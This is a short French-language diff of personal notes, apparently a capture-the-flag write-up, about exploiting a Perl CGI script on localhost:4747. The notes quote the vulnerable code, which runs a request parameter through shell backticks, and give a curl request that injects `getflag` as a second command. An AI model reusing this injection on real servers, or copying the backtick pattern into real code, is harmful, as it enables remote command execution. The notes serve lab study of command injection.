@@ -1,0 +1,25 @@
+qi0maab88jeaj46qoumi7maus
+on trouve un .pl
+un cat révelle le texte suivant
+
+text/html\n\n
+
+c'est un commande html
+curl ?
+
+localhost:4747
+besoin de se connecter à ça donc ?
+
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+on a besoin d'un parametre x
+probablement getflag
+fait juste echo "getflag"
+
+pas bon, besoin d'enfermer getflag pour en faire une fonction
+curl localhost:4747?x=\`getflag\`
+
